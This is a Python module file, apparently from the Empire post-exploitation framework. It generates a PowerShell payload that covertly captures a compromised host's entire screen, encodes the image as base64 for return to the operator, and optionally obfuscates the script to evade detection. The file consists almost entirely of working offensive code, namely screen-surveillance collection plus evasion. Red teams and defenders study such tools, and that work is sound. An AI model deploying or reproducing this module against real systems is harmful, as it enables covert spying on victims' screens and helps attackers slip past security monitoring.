from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        script = """
function Get-Screenshot 
{
    param
    (
        [Parameter(Mandatory = $False)]
        [string]
        $Ratio
    )
    Add-Type -Assembly System.Windows.Forms;
    $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen;
    $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height;
    $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject);
    $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size);
    $DrawingGraphics.Dispose();
    $ms = New-Object System.IO.MemoryStream;
    if ($Ratio) {
    	try {
    		$iQual = [convert]::ToInt32($Ratio);
    	} catch {
    		$iQual=80;
    	}
    	if ($iQual -gt 100){
    		$iQual=100;
    	} elseif ($iQual -lt 1){
    		$iQual=1;
    	}
    	$encoderParams = New-Object System.Drawing.Imaging.EncoderParameters;
    	$encoderParams.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, $iQual);
    	$jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.FormatDescription -eq \"JPEG\" }
    	$ScreenshotObject.save($ms, $jpegCodec, $encoderParams);
    } else {
    	$ScreenshotObject.save($ms, [Drawing.Imaging.ImageFormat]::Png);
    }
    $ScreenshotObject.Dispose();
    [convert]::ToBase64String($ms.ToArray());
}
Get-Screenshot"""

        if params['Ratio']:
            if params['Ratio']!='0':
                module.output_extension = 'jpg'
            else:
                params['Ratio'] = ''
                module.output_extension = 'png'
        else:
            module.output_extension = 'png'

        for option,values in params.items():
            if option.lower() != "agent":
                if values and values != '':
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values)
        # Get the random function name generated at install and patch the stager with the proper function name
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
